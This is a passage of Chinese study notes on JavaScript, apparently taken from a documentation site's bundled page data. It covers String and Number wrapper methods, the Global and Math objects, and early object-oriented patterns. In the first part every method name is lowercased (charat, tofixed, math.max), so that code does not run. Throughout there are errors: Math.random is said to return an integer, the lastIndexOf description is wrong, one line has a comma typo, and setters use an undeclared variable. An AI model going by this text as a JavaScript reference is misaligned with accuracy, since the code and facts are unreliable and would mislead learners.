"1e+2"\nconsole.log(num.toprecision(2));    // "99"\nconsole.log(num.toprecision(3));    // "99.0"\n\n\n1\n2\n3\n4\n\n\ntofixed()和toexponential()的入参都是指定小数位数，而toprecision()的入参是指定的所有数字位数（整数位加上小数位，但不包括指数位）。\n\ntypeof和instanceof可区分number的基本类型和包装类型。\n\n\n# 6.3 string包装类型\n\nstring包装类型是字符串对应的引用类型，创建对象调用string构造函数时传入相应的字符串。\n\n每个实例都有length属性，表示字符串包含字符的 个数，即使是 双字节字符串也算一个字符。\n\n继承有valueof()、tostring()、tolocalestring()方法，都返回对象所表示的基本字符串的值。\n\n# 6.3.1 charat/charcodeat字符\n\n * charat()返回给定位置的那个字符；\n * charcodeat()返回给定位置的那个字符的字符编码；\n * ecmascript5还定义方括号加索引的方式来访问字符串中特定位置的字符，例：stringvalue[0]\n\nvar stringvalue = "hello world";\nconsole.log(stringvalue.charat(1));         // "e"\nconsole.log(stringvalue.charcodeat(1));     // 101  小写字母e的字符编码\n\n\n1\n2\n3\n\n\n# 6.3.2 concat/slice/substr/substring拼接裁剪\n\n * concat()先创建当前字符串的一个副本，然后将接收到的一个或多个参数拼接到这个副本的末尾。其实字符串拼接更多的还是使用+操作符。\n   \n   var stringvalue = "hello";\n   var result = stringvalue.concat(" world", "!");\n   console.log(result);  // "hello world!"  注意此时stringvalue的值还是"hello"\n   \n   \n   1\n   2\n   3\n   \n\n * slice(start, end)是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从[start, end)截取字符串；如果start和end中任意一个有负数，则会在负数基础上加上字符串的长度进行截取。\n   \n   var stringvalue = "hello world";\n   console.log(stringvalue.slice(-3));    // -3+11=8，从位置8截取至末尾，"rld"\n   console.log(stringvalue.slice(3, -4)); // -4+11=7，从[3, 7)截取，"lo wo"\n   \n   \n   1\n   2\n   3\n   \n\n * substr(start, n)也是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从start位置截取n长度的字符串；如果start为负数，那在负数基础上加上字符串的长度，但是如果n为负数意味着不截（截取0个）。\n   \n   var stringvalue = "hello world";\n   console.log(stringvalue.substr(-3));    // -3+11=8，从位置8截取至末尾，"rld"\n   console.log(stringvalue.substr(3, -4)); // -4变为0，不截取，""\n   \n   \n   1\n   2\n   3\n   \n\n * substring(start, end)也是截取字符串；如果参数end不存在，则会从start位置截取至末尾，否则从[start, end)截取字符串；如果start和end中任意一个有负数，就将这个负数变为0；如果都是非负数，并且end比start小，那实际上就是从[end, start)截取字符串。\n   \n   var stringvalue = "hello world";\n   console.log(stringvalue.substring(-3));    // -3变为0，从位置0截取至末尾，"hello world"\n   console.log(stringvalue.substring(3, -4)); // -4变为0，0小于3，从[0, 3)截取，"hel"\n   \n   \n   1\n   2\n   3\n   \n\n# 6.3.3 indexof/lastindexof搜索字符\n\n * indexof(s, index)如果参数index不存在，会从0位置往 右 搜索字符s，参数index存在就会从位置idnex往 右 搜索字符s；搜索到的话会返回字符s的索引值，否则返回-1。\n * lastindexof(s, index)如果参数index不存在，会从0位置往 左 搜索字符s，参数index存在就会从位置idnex往 左 搜索字符s；搜索到的话会返回字符s的索引值，否则返回-1。\n\nvar stringvalue = "hello world";\nconsole.log(stringvalue.indexof("o", 6));       // 7\nconsole.log(stringvalue.lastindexof("o", 6));   // 4\n\n\n1\n2\n3\n\n\n# 6.3.4 trim删除空格\n\n * ecmascript5为字符串定义了一个trim()方法，它会先创建一个字符串副本，删除这个副本 前置 以及 后缀 的所有空格。\n * 有些浏览器还支持非标准的trimleft()和trimright()方法，单纯只删除 前置或后缀 的空格\n\n# 6.3.5 tolowercase/touppercase大小写转换\n\n * tolowercase()将字符串全转为小写；\n * touppercase()将字符串全转为大写；\n * 当不知道代码在哪种语言（哪个地区）环境中运行，可以采用tolocalelowercase()和tolocaleuppercase()。\n\n# 6.3.6 match/search模式匹配\n\n * match()与regexp对象调用exec()效果一样，也只是入参和使用对象对调了。\n   \n   var text = "cat, bat, sat, fat";\n   var pattern = /.at/;\n   var matches = text.match(pattern);    // 与pattern.exec(text)效果一样\n   console.log(matches.index);           // 0\n   console.log(matches[0]);              // "cat"\n   console.log(matches,lastindex);       // 0\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n * search()只有一个入参，该入参是正则表达式；它始终会从字符串开头向后查找正则表达式所匹配到的 第一个匹配项的索引，没查到会返回-1。\n   \n   var text = "cat, bat, sat, fat";\n   var pos = text.search(/at/);\n   console.log(pos);     // 1\n   \n   \n   1\n   2\n   3\n   \n\n# 6.3.7 replace/split替换和分割\n\nreplace()接受两个参数，第一个参数是 regexp对象或字符串，第二个参数是 字符串或函数，返回替换后的新字符串，但不影响原字符串（事先创建了字符串 副本）。\n\n 1. 当第一个参数是字符串时，只替换匹配到的 第一项；当第一个参数是正则表达式并且指定 全局标志(g) 时，才会替换 所有 能匹配到的项。例：\n    \n    var text = "cat, bat, sat, fat";\n    var result = text.replace("at", "ond");\n    console.log(result);                     // "cond, bat, sat, fat"\n    result = text.replace(/at/g, "ond");\n    console.log(result);                     // "cond, bond, sond, fond"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. 当第一个参数是正则表达式，第二个参数是字符串时，这个字符串里可使用一些 特殊字符序列，将正则表达式匹配到的值，插入到第二个参数字符串的特殊字符序列所在的位置。\n    \n    字符序列   替换文本\n    $$     $\n    $&     匹配整个模式的子字符串；与regexp.lastmatch的值相同\n    $\'     匹配的子字符串之前的子字符串；与regexp.leftcontext的值相同\n    $`     匹配的子字符串之后的子字符串；与regexp.rightcontext的值相同\n    $n     匹配第n个捕获组的子字符串，其中n等于0到9\n    $nn    匹配第nn个捕获组的子字符串，其中nn等于01到99\n    \n    var text = "cat, bat, sat, fat";\n    var result = text.replace(/(.at)/g, "word[$1]"); // 要是/(.at)/g，不能是/.at/g\n    console.log(result); // "word[cat], word[bat], word[sat], word[fat]"\n    \n    \n    1\n    2\n    3\n    \n\n 3. 当第二个参数是一个函数时，在只有一个匹配项情况下，会向这个函数传递3个参数：模式的匹配项、模式匹配项在字符串中的位置、元素字符串。在正则表达式中定义多个捕获组的情况下，传递给函数的参数依次是模式的匹配项、第一个捕获组的匹配项、第二个捕获组的匹配项，...，但最后两个参数仍然分别是模式匹配项在字符串中的位置和原始字符串。这个函数应该返回一个字符串，表示应该被替换的匹配项。\n    \n     function htmlescape(text) {\n         return text.replace(/[<>"&]/g, function (match, pos, originaltext) {\n             switch (match) {\n                 case "<":\n                     return "&lt;";\n                 case ">":\n                     return "&gt;";\n                 case "&":\n                     return "&amp;";\n                 case "\\"":\n                     return "&quot;";\n             }\n         });\n     }\n     // &lt;p class=&quot;greeting&quot;&gt;hello world!&lt;/p&gt;\n     console.log(htmlescape("<p class=\\"greeting\\">hello world!</p>"));\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\nsplit()基于指定 分隔符 将一个字符串分割成多个 子字符串，并把结果存放在一个 数组 里。分隔符可以是字符串也可以是一个 regexp对象，当然也可以接受可选的第二参数，来限定数组的大小。\n\nvar colortext = "red, blue, green, yellow";\nvar colors1 = colortext.split(", ");        // ["red", "blue", "green", "yellow"]\nvar colors2 = colortext.split(", ", 2);     // ["red", "blue"]\nvar colors3 = colortext.split(/[^\\,]+/);    // ["", ",", ",", ",", ""]\n\n\n1\n2\n3\n4\n\n\n# 6.3.8 localecompare比较\n\nlocalecompare()由于比较两个字符串，返回值情况如下：\n\n * 如果参数字符串在字母表中排在调用字符串之前（一位位进行比较），则返回一个正数（大多数是1）；\n * 如果参数字符串等于调用字符串，则返回0；\n * 如果参数字符串在字母表中排在调用字符串之后，则返回一个负数（大多数是-1）。\n\nvar stringvalue = "yellow";\nconsole.log(stringvalue.localecompare("brick"));    // 1\nconsole.log(stringvalue.localecompare("yellow"));   // 0\nconsole.log(stringvalue.localecompare("zoo"));      // -1\n\n\n1\n2\n3\n4\n\n\n# 6.3.9 fromcharcode字符转换\n\nfromcharcode()是string构造函数本身的一个静态方法，接收一个或多个字符编码，将它们转换成一个字符串，可以看做charcodeat()的反向操作。\n\nconsole.log(string.fromcharcode(104, 101, 108, 108, 111));  // "hello"\n\n\n1\n\n\n\n# 七、单体内置对象\n\n内置对象：由ecmascript提供 不依赖宿主环境 的对象，在代码执行前就已经存在。object、array和object是之前介绍过的内置对象，这一节主要讲两个 单体内置对象：global和math。\n\n\n# 7.1 global对象\n\necmascript中的global对象像一个兜底儿对象，即 不属于任何其他对象的属性和方法最终都是它的属性和方法 。比如在全局环境中定义的属性和函数都是global对象的属性，诸如isnan()、isfinite()、parseint()、parsefloat()都是global对象的方法。\n\n# 7.1.1 uri编码\n\n * global对象的encodeuri()和encodeuricomponent()这两个方法可以对uri进行特殊的utf-8编码，使得浏览器能够接受和理解。\n\n * encodeuricomponent()会对 所有非字母、非数字的字符 进行编码；encodeuri()只对非字母、非数字字符中类似于空格这样 无效字符 进行编码，而对uri中特殊字符比如 冒号、正斜杠、问号和井字号 就不会编码；encodeuricomponent()要用得更多一些。\n   \n   var uri = "http://www.wrox.com/illegal value.htm#start";\n   console.log(encodeuri(uri)); // "http://www.wrox.com/illegal%20value.htm#start";\n   console.log(encodeuricomponent(uri)); // "http%3a%2f%2fwww.wrox.com%2fillegal%20value.htm%23start";\n   \n   \n   1\n   2\n   3\n   \n\n * decodeuri()和decodeuricomponent()是对应encodeuri()和encodeuricomponent()的反向解码方法。\n\n# 7.1.2 eval()方法\n\neval()在之前就提到过，它在执行期可能会改变编译期的作用域，从而导致性能问题，它还有一个问题是作为动态代码生成的一个方法很可能造成代码注入等安全问题。\n\n# 7.1.3 global对象的属性\n\n属性          说明             属性               说明\nundefined   特殊值undefined   date             构造函数date\nnan         特殊值nan         regexp           构造函数regexp\ninfinity    特殊值infinity    error            构造函数error\nobject      构造函数object     evalerror        构造函数evalerror\narray       构造函数array      rangeerror       构造函数rangeerror\nfunction    构造函数function   referenceerror   构造函数referenceerror\nboolean     构造函数boolean    syntaxerror      构造函数syntaxerror\nstring      构造函数string     typeerror        构造函数typeerror\nnumber      构造函数number     urierror         构造函数urierror\n\n# 7.1.3 window对象\n\nweb浏览器是将global对象这个全局对象作为window对象的一部分加以实现的，全局执行环境中的变量对象可以认为是window对象，this在默认绑定形式下绑定的是window对象。\n\n\n# 7.2 math对象\n\n用来保存数学公式和信息，math提供的方法要比自己设计的计算功能执行起来要快。\n\n# 7.2.1 math对象属性\n\n属性             说明\nmath.e         自然对数的底数，即常量e的值\nmath.ln10      10的自然对数\nmath.ln2       2的自然对数\nmath.log2e     以2为底e的对数\nmath.log10e    以10为底e的对数\nmath.pi        π的值\nmath.sqrt1_2   1/2的平方根\nmath.sqrt2     2的平方根\n\n# 7.2.2 min/max最大最小值\n\n * math.min()和math.max()都可以接受任意多个数值参数，用于确定这组数值中 最大和最小值。\n   \n   var max = math.max(3, 54, 32, 16);\n   console.log(max); // 54\n   var min = math.min(3, 54, 32, 16);\n   console.log(min); // 3\n   \n   \n   1\n   2\n   3\n   4\n   \n\n * math.min()和math.max()可以配合apply()来求一个数组的最大和最小值，也就不用再一个个传给math.min()和math.max()了。\n   \n   var values = [1, 2, 3, 4, 5, 6, 7, 8];\n   var max = math.max.apply(math, values); // max方法是math里的，那么apply的第一个参数自然是math\n   console.log(max); // 8\n   \n   \n   1\n   2\n   3\n   \n\n# 7.2.3 ceil/round/floor取整\n\n * math.ceil()向上取整\n * math.round()四舍五入\n * math.floor()向下取整\n\n# 7.2.4 random取随机数\n\nmath.random()返回大于等于0小于1的一个随机数，也就是返回[0, 1)区间的一个整数\n\n// 函数的作用：返回[lower, upper]区间里的整数\nfunction selectfrom(lower, upper) {\n    var choices = upper - lower + 1;    // 加1的原因是结果可以等于upper，需要“加一”并配合“向下取整”\n    return math.floor(math.random() * choices + lower); // 加lower自然是因为最后的区间从lower开始的\n}\nvar num = selectfrom(2, 10);    // 随机返回[2, 10]区间里的整数\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 7.2.5 其他方法\n\n方法                     说明               方法                说明\nmath.abs(num)          返回num的绝对值        math.asin(x)      返回x的反正弦值\nmath.exp(num)          返回math.e的num次幂   math.atan(x)      返回x的反正切值\nmath.log(num)          返回num的自然对数       math.atan2(y,x)   返回y/x的反正切值\nmath.pow(num, power)   返回num的power次幂    math.cos(x)       返回x的余弦值\nmath.sqrt(num)         返回num的平方根        math.sin(x)       返回x的正弦值\nmath.acos(x)           返回x的反余弦值         math.tan(x)       返回x的正切值',charsets:{cjk:!0}},{title:"4.面向对象程序设计",frontmatter:{title:"4.面向对象程序设计"},regularPath:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html",relativePath:"book-web/html、css、js、ts/学习JavaScript/4.面向对象程序设计.md",key:"v-de7a9464",path:"/book-web/html%E3%80%81css%E3%80%81js%E3%80%81ts/%E5%AD%A6%E4%B9%A0JavaScript/4.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1.html",headers:[{level:2,title:"一、理解对象",slug:"一、理解对象",normalizedTitle:"一、理解对象",charIndex:15},{level:3,title:"1.1 属性类型",slug:"_1-1-属性类型",normalizedTitle:"1.1 属性类型",charIndex:659},{level:3,title:"1.2 定义多个属性",slug:"_1-2-定义多个属性",normalizedTitle:"1.2 定义多个属性",charIndex:2649},{level:3,title:"1.3 读取属性的特性",slug:"_1-3-读取属性的特性",normalizedTitle:"1.3 读取属性的特性",charIndex:3337},{level:2,title:"二、创建对象",slug:"二、创建对象",normalizedTitle:"二、创建对象",charIndex:4439},{level:3,title:"2.1 工厂模式",slug:"_2-1-工厂模式",normalizedTitle:"2.1 工厂模式",charIndex:4532},{level:3,title:"2.2 构造函数模式",slug:"_2-2-构造函数模式",normalizedTitle:"2.2 构造函数模式",charIndex:5054},{level:3,title:"2.3 原型模式",slug:"_2-3-原型模式",normalizedTitle:"2.3 原型模式",charIndex:7249},{level:3,title:"2.4 组合使用构造函数模式和原型模式",slug:"_2-4-组合使用构造函数模式和原型模式",normalizedTitle:"2.4 组合使用构造函数模式和原型模式",charIndex:13563},{level:3,title:"2.5 动态原型模式",slug:"_2-5-动态原型模式",normalizedTitle:"2.5 动态原型模式",charIndex:14361},{level:3,title:"2.6 寄生构造函数模式",slug:"_2-6-寄生构造函数模式",normalizedTitle:"2.6 寄生构造函数模式",charIndex:14785},{level:3,title:"2.7 稳妥构造函数模式",slug:"_2-7-稳妥构造函数模式",normalizedTitle:"2.7 稳妥构造函数模式",charIndex:15325},{level:2,title:"三、继承",slug:"三、继承",normalizedTitle:"三、继承",charIndex:15883},{level:3,title:"3.1 原型链",slug:"_3-1-原型链",normalizedTitle:"3.1 原型链",charIndex:15987},{level:3,title:"3.2 借用构造函数",slug:"_3-2-借用构造函数",normalizedTitle:"3.2 借用构造函数",charIndex:18707},{level:3,title:"3.3 组合继承",slug:"_3-3-组合继承",normalizedTitle:"3.3 组合继承",charIndex:19271},{level:3,title:"3.4 原型式继承",slug:"_3-4-原型式继承",normalizedTitle:"3.4 原型式继承",charIndex:20548},{level:3,title:"3.5 寄生式继承",slug:"_3-5-寄生式继承",normalizedTitle:"3.5 寄生式继承",charIndex:22889},{level:3,title:"3.6 寄生组合式继承",slug:"_3-6-寄生组合式继承",normalizedTitle:"3.6 寄生组合式继承",charIndex:23311}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"一、理解对象 1.1 属性类型 1.2 定义多个属性 1.3 读取属性的特性 二、创建对象 2.1 工厂模式 2.2 构造函数模式 2.3 原型模式 2.4 组合使用构造函数模式和原型模式 2.5 动态原型模式 2.6 寄生构造函数模式 2.7 稳妥构造函数模式 三、继承 3.1 原型链 3.2 借用构造函数 3.3 组合继承 3.4 原型式继承 3.5 寄生式继承 3.6 寄生组合式继承",content:'# 面向对象程序设计\n\n\n# 一、理解对象\n\n面向对象的语言 有一个标志，那就是它们都有 类 的概念，通过类可以创建任意多个具有 相同属性和方法 的对象。而 ECMAScript没有类的概念，与其他基于类的语言创建的对象不同的是，ECMAScript定义的对象是 无序属性 的集合，其属性可以是基本值、对象或函数。通俗点说就是ECMAScript里的对象，其属性是一群没有特点顺序的值，属性或方法都有自己的名字，这些名字有自己映射的值，可以把这样的对象结构想象成 散列表（键值对）。\n\n创建自定义对象早期用 构造函数 并 逐个将属性赋值，后来常用 对象字面量 来创建对象，例：\n\n// 构造函数的方式\nvar person = new Object();\nperson.name = "Nicholas";\nperson.age = 29;\nperson.job = "Software Engineer";\nperson.sayName = function() {\n    console.log(this.name);\n}\n\n// 对象字面量的方式\nvar person = {\n    name: "Nicholas",\n    age: 29,\n    job: "Software Engineer",\n    sayName: function() { console.log(this.name); }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 1.1 属性类型\n\nECAMScript属性有两种：数据属性 和 访问器属性。\n\nECAMScript5定义了内部才使用（实现js引擎）的 特性，是用来描述属性的各种特征的，特性是用两对方括号括起来表示的，例：[[Enumerable]]。\n\n# 1.1.1 数据属性\n\n数据属性有4个描述其行为的特性：\n\n * [[Configurable]]：可配置的，表示能否通过删除属性的行为从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性，该特性默认为true；\n * [[Enumerable]]：可枚举的，表示能否通过for-in循环返回属性，该特性默认为true；\n * [[Writable]]：可重写的，表示能否修改属性的值，该特性默认为true；\n * [[Value]]：包含这个属性的数据值，属性值的读写都在这个位置，该特性默认为undefined。\n\n想修改属性默认的特性，可以使用ECMAScript5的Object.defineProperty()方法，接收三个参数：属性所在的对象、属性的名字 和 一个描述符对象。其中描述符对象的属性必须是configurable、enumerable、writable和value中的一个或多个。\n\nvar person = {};\nObject.defineProperty(person, "name", {\n    configurable: false,    // 不可配置，那么不能通过删除语句来删除对象的这个属性，并且其他特性也不能修改了，configurable也改不回true了\n    value: "Nicholas"\n});\nconsole.log(person.name);   // "Nicholas"\ndelete person.name;         // 因为[[Configurable]]特性为false，这里删除无效\nconsole.log(person.name);   // "Nicholas"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n之前是使用Object.defineProperty()修改属性，如果使用它 创建新属性，不指定[[Configurable]]、[[Enumerable]]、[[Writable]]特性时，这三个会被默认设置为 false。\n\n大多数情况下不会去使用Object.defineProperty()操作属性的那些特性（没有使用的必要），只是为了加深对JavaScript对象的理解。\n\n# 1.1.2 访问器属性\n\n访问器属性不包含数据值，但包含一对getter和setter函数（非必需的），访问器属性有4个特性：\n\n * [[Configurable]]：可配置的，表示能否通过删除属性的行为从而重新定义属性，能否修改属性的特性，或者能否把属性修改为访问器属性，该特性默认为true；\n * [[Enumerable]]：可枚举的，表示能否通过for-in循环返回属性，该特性默认为true；\n * [[Get]]：在读取属性时调用的函数，该特性默认为undefined；\n * [[Set]]：在写入属性时调用的函数，该特性默认为undefined。\n\n访问器属性不能直接定义，必须使用Object.defineProperty()来定义。\n\nvar book = {\n    _year: 2004,    // 下划线一般表示为只能通过对象方法访问的属性（内部属性）\n    edition: 1\n};\nObject.defineProperty(book, "year", {\n    get: function() {\n        return this._year;\n    },\n    set: function(newValue) {   // 使用访问器属性的常见方式，即设置一个属性的值会导致其他属性发生变化\n        if (newValue > 2004) {\n            this._year = newValue;\n            this.edition += newValue - 2004;\n        }\n    }\n});\nbook.year = 2005;\nconsole.log(book.edition); // 2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n只指定getter而不指定setter，意味着属性不能写，尝试写入属性会被忽略，严格模式下会抛错；\n只指定setter而不指定getter，意味着属性不能读，尝试读出属性会返回undefined，严格模式下会抛错。\n\n\n# 1.2 定义多个属性\n\nObject.defineProperties()方法可以通过描述符一次定义多个属性。第一个参数是要添加和修改其属性的对象（目标对象），第二个参数是一个对象其属性与目标对象的属性一一对应。\n\nvar book = {};\nObject.defineProperties(book, {\n    _year: {                // 数据属性\n        writable: true,\n        value: 2004\n    },\n    edition: {              // 数据属性\n        writable: true,\n        value: 1\n    },\n    year: {                 // 访问器属性（三个属性同时创建）\n        get: function() {\n            return this._year;\n        },\n        set: function() {\n            if (newValue > 2004) {\n                this._year = newValue;\n                this.edition += newValue - 2004;\n            }\n        }\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 1.3 读取属性的特性\n\nObject.getOwnPropertyDescriptor()可以取得给定属性的 描述符。接收两个参数：属性所在的对象、要读取其描述符的属性名称。返回值是一个对象，这个对象有configurable、enumerable、writable和value（如果是访问器属性，那返回值属性是configurable、enumerable、get和set）。\n\nvar book = {};\nObject.defineProperties(book, {\n    _year: {\n        value: 2004\n    },\n    edition: {\n        value: 1\n    },\n    year: {\n        get: function() {\n            return this._year;\n        },\n        set: function() {\n            if (newValue > 2004) {\n                this._year = newValue;\n                this.edition += newValue - 2004;\n            }\n        }\n    }\n});\nvar descriptor = Object.getOwnPropertyDescriptor(book, "_year");\nconsole.log(descriptor.value);          // 2004\nconsole.log(descriptor.configurable);   // false\nconsole.log(typeof descriptor.get);     // undefined\n\nvar descriptor = Object.getOwnPropertyDescriptor(book, "year");\nconsole.log(descriptor.value);          // undefined\nconsole.log(descriptor.enumerable);     // false\nconsole.log(typeof descriptor.get);     // "function"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 二、创建对象\n\n使用 构造函数式 或者 对象字面量 来创建对象，有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为解决这个问题，推出了 工厂模式 的一种变体。\n\n\n# 2.1 工厂模式\n\n工厂模式 抽象了创建具体对象的过程。用函数来封装以特定接口创建对象的细节。\n\nfunction createPerson(name, age, job) {\n    var o = new Object();\n    o.name = name;\n    o.age = age;\n    o.job = job;\n    o.sayName = function() {\n        console.log(this.name);\n    }\n    return o;\n}\nvar person1 = createPerson("L", 22, "Student");\nvar person2 = createPerson("S", 35, "Doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n函数createPerson可以根据入参来创建不同的对象（属性名相同，但属性值不同），下次创建新对象时不再需要写创建对象的代码了重新调用即可。\n\n工厂模式虽然解决了创建多个相似对象的问题（代码重复的问题，还隐藏了细节），但却没有解决 对象识别 的问题（即怎么知道一个对象的类型）。\n\n\n# 2.2 构造函数模式\n\n构造函数模式 改进了工厂模式，在函数里 不显示 创建对象了，直接将属性和方法赋给了函数的 this对象，去掉了 return 语句。然后参考其他语言的规范，将函数的首字母大写了，实例化时还使用了new关键字，这样也就区分了ECMAScript中的其他函数，这种函数就叫做 构造函数。\n\nfunction Person(name, age, job) {   // (1)隐式创建了一个新对象，\n    this.name = name;               // (2)函数调用处的执行环境赋给了新对象，\n    this.age = age;                 // (3)为这个新对象添加属性，\n    this.job = job;                 // (4)最后隐式返回了这个新对象\n    this.sayName = function() {\n        console.log(this.name);\n    }\n}\nvar person1 = new Person("L", 22, "Student");\nvar person2 = new Person("S", 35, "Doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nperson1和person2都拥有同一个constructor（构造函数）属性，该属性指向Person（解决了工厂模式不能识别对象类型的问题），检查对象可以使用这个属性，但最好还是使用instanceof。\n\nconsole.log(person1.constructor == Person);     // true\nconsole.log(person2.constructor == Person);     // true\n\nconsole.log(person1 instanceof Object);         // true\nconsole.log(person2 instanceof Object);         // true\nconsole.log(person1 instanceof Person);         // true\nconsole.log(person2 instanceof Person);         // true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 2.2.1 将构造函数当作函数\n\n// 当作构造函使用\nvar person = new Person("L", 22, "Student");\nperson.sayName(); // "L"\n\n// 作为普通函数调用\nPerson("S", 35, "Doctor");\nwindow.sayName(); // "S"\n\n// 在另一个对象的作用域中调用\nvar o = new Object();\nPerson.call(o, "L", 22, "Student");\no.sayName(); // "L"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n将构造函数当作函数一般就两种使用方式，一种是不使用new而直接调用，另一种就是不使用new但配合call()使用。\n\n * 不使用new而直接调用：属性和方法都被添加给window对象了，因为它是在全局作用域中调用的，this对象指向window对象（Global对象）；\n * 不使用new但配合call()使用：配合apply()也可以的；外部新建了一个对象，让这个对象作为call的第一个参数，也就是说Person的执行环境就是这个新对象了，最后Person里的新属性和方法都会添加到这个新对象上。\n\n# 2.2.2 构造函数的问题\n\n构造函数的主要问题：每个方法都要在每个实例上 重新创建 一遍，也就是说每个实例拥有同名函数但值不同。\n\nconsole.log(person1.sayName == person2.sayName);    // false\n\n\n1\n\n\n要解决这个问题，可以在构造函数的 外部 创建一个函数，让构造函数里的那个属性指向这个新函数，那么所有实例对象的那个属性也都指向了这个新函数。\n\nfunction Person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n    this.sayName = sayName;\n}\nfunction sayName() {\n    console.log(this.name);\n}\nvar person1 = new Person("L", 22, "Student");\nvar person2 = new Person("S", 35, "Doctor");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n这样确实解决了 重复创建函数 的问题，但是有了新问题：外部定义的新函数应该只能被对应的构造函数所使用，但实际上其他构造函数一样能使用，这就比较混乱了，然后构造函数里要是需要多个函数，那么在外部还要创建多个新函数（没有封装性）。\n\n\n# 2.3 原型模式\n\n函数都有一个prototype属性，它指向一个对象（原型对象），这个对象上存储了 所有实例共享的属性和方法。意思就是，通过某个构造函数实例出的一些对象，它们都共享了 原型对象 上的属性和方法。\n\n使用原型对象的好处是， 不必在构造函数里 定义对象实例的信息，可以直接将这些信息添加到原型对象中。\n\nfunction Person() {}\nPerson.prototype.name = "S";\nPerson.prototype.age = 35;\nPerson.prototype.job = "Doctor";\nPerson.prototype.sayName = function() {\n    console.log(this.name);\n}\nvar person1 = new Person();\nperson1.sayName();          // "S"\nvar person2 = new Person();\nperson2.sayName();          // "S"\nconsole.log(person1.sayName == person2.sayName); // true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2.3.1 理解原型对象\n\n函数的prototype属性指向原型对象，而原型对象有个constructor属性，这个属性是指向 原型对象所在函数 的，也就是说Person.prototype.constructor是指向Person的；原型对象也会有其他常见属性和方法，这是从Object继承而来的；然后剩下的就是在代码中自己添加的属性和方法了。\n\n使用原型模式创建出来的实例，该实例有个内部属性[[Prototype]]，该内部属性是指向 对应构造函数的原型对象 的，不是指向构造函数的，这点要区分开来。构造函数的prototype和实例的[[Prototype]]都指向原型对象的。\n\n可以使用isPrototypeOf()来确定当前原型对象是否被目标实例内部属性[[Prototype]]指引着，例：\n\nconsole.log(Person.prototype.isPrototypeOf(person1));   // true，person1的内部属性[[Prototype]]是指向Person.prototype的\nconsole.log(Person.prototype.isPrototypeOf(person2));   // true，person2的内部属性[[Prototype]]是指向Person.prototype的\n\n\n1\n2\n\n\nECMAScript5新增的Object.getPrototypeOf()方法可以获得 实例内部属性[[Prototype]]指向的原型对象，例：\n\nconsole.log(Object.getPrototypeOf(person1) == Person.prototype);   // true，person1的内部属性[[Prototype]]是指向Person.prototype的\nconsole.log(Object.getPrototypeOf(person1).name);   // "S"，原型对象上name属性\n\n\n1\n2\n\n\n读取对象某个属性的过程：会先从 对象实例本身 开始搜索，如果在实例中搜索到该属性就会返回该属性的值，如果没有找到会去实例对应的 原型对象 上搜索，搜索到该属性会返回该属性的值。\n\n虽然可以通过对象实例访问保存在原型中的值，但却 不能通过对象实例重写原型中的值；当然，如果在对象实例上添加了一个与原型对象里 同名 的属性，那实例上的这个属性会 屏蔽 原型对象上的同名属性（因为读取属性的过程就是实例属性优先）。 可以屏蔽但不能修改。\n\nhasOwnProperty()方法可以检测一个 属性是存在于实例对象中，存在于实例中会返回true，否则返回false（存在原型中或原型里也不存在）。例如上面使用delete后，person1里的name属性是属于原型对象的，这时使用hasOwnProperty()会返回false，person1.hasOwnProperty("name"); // false。\n\nfunction Person() {}\nPerson.prototype.name = "S";\nPerson.prototype.age = 35;\nPerson.prototype.job = "Doctor";\nPerson.prototype.sayName = function() {\n    console.log(this.name);\n}\nvar person1 = new Person();\nvar person2 = new Person();\nperson1.name = "L";\nconsole.log(person1.name);      // "L"，屏蔽了\nconsole.log(person2.name);      // "S"\n\ndelete person1.name;            // 解除屏蔽\nconsole.log(person1.name);      // "S"\nperson1.hasOwnProperty("name"); // false，实例上没有name属性了\nObject.getPrototypeOf(person1).name = "SS"; // error，不能通过对象实例重写原型中的值\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 2.3.2 原型与in操作符\n\n单独使用in操作符：判断属性是否存在于对象中，判断不了该属性是存在于 实例 中还是 原型 中。\n\nfunction hasPrototypeProperty(object, name) {\n    return !object.hasOwnProperty(name) && (name in object); // return结果为true时，name在原型对象中\n}\n\n\n1\n2\n3\n\n\n在for-in循环中使用：遍历对象的可枚举属性，不管它存在于 实例 中还是 原型 中。\n\nfunction Person(name, age, job) {\n    this.name = name;\n    this.age = age;\n    this.job = job;\n}\nPerson.prototype.sayName = function() {\n    console.log(this.name);\n}\nvar person = new Person("S", 